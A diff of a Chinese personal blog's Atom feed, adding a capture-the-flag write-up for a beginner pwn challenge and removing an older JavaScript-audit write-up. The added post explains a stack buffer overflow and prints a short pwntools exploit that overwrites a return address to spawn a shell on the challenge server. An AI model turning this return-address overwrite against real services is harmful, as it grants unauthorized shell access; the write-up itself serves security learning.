@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-05-28T11:38:32.974Z</updated>
+    <updated>2020-05-29T00:09:55.342Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,41 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 小张的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[攻防世界pwn新手区—level0]]></title>
+        <id>https://zhangzy999.github.io/post/adworld_level0/</id>
+        <link href="https://zhangzy999.github.io/post/adworld_level0/">
+        </link>
+        <updated>2020-05-28T23:24:59.000Z</updated>
+        <content type="html"><![CDATA[<p>下载附件，简单运行一下，发现出现一个hello world然后让我们输入一个字符串，然后就退出程序……<br>
+我们拿到ida里面看一看<br>
+<img src="https://zhangzy999.github.io//post-images/1590708401179.png" alt="" loading="lazy"><br>
+发现有一个vul这种函数，我们跟进去看看<br>
+<img src="https://zhangzy999.github.io//post-images/1590708423813.png" alt="" loading="lazy"><br>
+发现buf这个变量向堆栈申请了80h这个长度，也就是128个字节，但是我们可以输入200个字节，这个就很危险了，可以确定偏移量为80h+8没错了，我们就是要先填充垃圾字符搞一下80h+8，然后将函数的返回地址改写成system至于为啥是80h+8，放个图，就不解释了（汇编画画堆栈图就知道啦）<br>
+<img src="https://zhangzy999.github.io//post-images/1590708690016.png" alt="" loading="lazy"><br>
+然后还发现有system函数<br>
+<img src="https://zhangzy999.github.io//post-images/1590708707600.png" alt="" loading="lazy"><br>
+我们一路跟进去，找找函数地址在哪<br>
+<img src="https://zhangzy999.github.io//post-images/1590708724959.png" alt="" loading="lazy"><br>
+完美，拿到了函数地址，那么构造exp就很简单了：</p>
+<pre><code class="language-python">from pwn import *
+
+r = remote('124.126.19.106','35956')
+
+offset = 0x80 + 8
+system_addr = 0x400596
+
+payload = offset * 'A' + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>直接拿到shell了<br>
+<img src="https://zhangzy999.github.io//post-images/1590708766436.png" alt="" loading="lazy"><br>
+cat /flag 就完辣</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[攻防世界pwn新手区—hello_pwn]]></title>
         <id>https://zhangzy999.github.io/post/adworld_hello_pwn/</id>
@@ -556,60 +591,6 @@ alter table words change flag id varchar(100);#
 所以，开发的时候一定要兼顾安全！！尤其是涉及到数据库的安全<br>
 <s>我们回到攻击语句那里，甚至可以改下原来的words字段名字，改成 &quot;小张 is my hero&quot;</s><br>
 大家有问题可以在哔哩哔哩私信我哟</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[攻防世界web新手区javascript审计-"sample js"]]></title>
-        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-web-xin-shou-qu-gong-lue-yi-lan/</id>
-        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-web-xin-shou-qu-gong-lue-yi-lan/">
-        </link>
-        <updated>2020-04-27T03:24:13.000Z</updated>
-        <content type="html"><![CDATA[<p>打开环境，浏览器弹出窗口提示我们输入密码<br>
-<img src="https://zhangzy999.github.io//post-images/1587959009848.png" alt="" loading="lazy"></p>
-<p>我们习惯性的查看页面源码，并且题目已经给我们提示：“simple js”<br>
-得到一串js代码，应该是让我们审计js代码没跑了o.o<br>
-<img src="https://zhangzy999.github.io//post-images/1587959071008.png" alt="" loading="lazy"></p>
-<pre><code class="language-JavaScript">    function dechiffre(pass_enc){           //这一部分是定义了一个函数dechiffre,参数为pass_enc
-        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;     //定义了pass字符串
-        var tab  = pass_enc.split(',');     //定义了tab变量，其中.split()方法是将一个字符串分割为字符数组，括号里单引号下的逗号是按逗号分割
-                var tab2 = pass.split(',');     //tab2变量是对pass字符串进行的分割
-                var i,j,k,l=0,m,n,o,p = &quot;&quot;;     // 定义了许多变量，其中未被赋值的变量为undefined
-                i = 0;
-                j = tab.length;     //.length是返回tab数组的长度，j=36
-                k = j + (l) + (n=0);
-                n = tab2.length;    // 先定义了n=0，k=18+0+0=18     然后给n赋值n=18
-                for(i = (o=0); i &lt; (k = j = n); i++ )       //条件是i=0,i&lt;18(把n的值赋给j，再把j的值赋给k)
-                {
-                    o = tab[i-l];       //先把tab[i-1]的值赋给o但是我们会发现，后面紧接着有把tab2[i]的值赋给o，这一条语句相当于无用
-                    p += String.fromCharCode((o = tab2[i]));    //上面定义了变量p=“”,String.fromCharCode()方法是把Unicode编码转化为字符串
-                    if(i == 5)
-                        break;        
-                 }      // 通过运行此程序段，并且加上document.write(p+”&lt;br/&gt;”);输出p的值我们发现p=FAUX P
-                 for(i = (o=0); i &lt; (k = j = n); i++ ){     // 第二个for循环，i=0，i&lt;18,i++ 
-                        o = tab[i-l];
-                        if(i &gt; 5 &amp;&amp; i &lt; k-1)
-                             p += String.fromCharCode((o = tab2[i]));      //该条循环与上个循环相似，最终发现输出的p=FAUX PASSWORD HAH
-                        }
-        p += String.fromCharCode(tab2[17]);   
-        pass = p;
-        return pass;    //完整的p是p=p=FAUX PASSWORD HAHA（假的密码哈哈）😢
-    }
-    //最终函数返回p，但仔细观察我们发现p始终与tab2挂钩，而tab2的值是pass分割成数组的值，pass是定值，也就是说我们函数的参数pass_enc在这个函数里无用！
-    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
-    h = window.prompt('Enter password');
-    alert( dechiffre(h) );
-</code></pre>
-<p>以上我用注释的形式来为大家解释了每一条语句的作用，如果你是比我还萌的萌新，仔细看看肯定是会有收获的（狗头保命）<br>
-通过分析我们发现了我们传入的参数p对函数最后返回的结果毫无影响，<strong>因为无论我们输入什么都存到了tab里，而整个函数是对tab2这个数组的操作，无论我们输入什么，最终页面都返回给我们faux password haha</strong>,所以通过分析，那一串16进制的数字转码后应该就是flag了，因为它孤零零的在那里，前不着村后不着店，煞是诡异。。。<br>
-所以我们就自己写js代码，把他翻译出来，bingo!<br>
-首先我们先把那一串\x的给翻译成ascii，在python中自动完成：<br>
-<img src="https://zhangzy999.github.io//post-images/1587970672958.png" alt="" loading="lazy"><br>
-然后直接调用fromCharCode方法得到flag</p>
-<pre><code class="language-JavaScript">var password = String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
-console.log(password);
-</code></pre>
-<p><img src="https://zhangzy999.github.io//post-images/1587971171189.png" alt="" loading="lazy"><br>
-以上就是本题的解法，个人认为该题目还是有那么一丢丢难度的（毕竟我js不太好😶）</p>
 ]]></content>
     </entry>
 </feed>
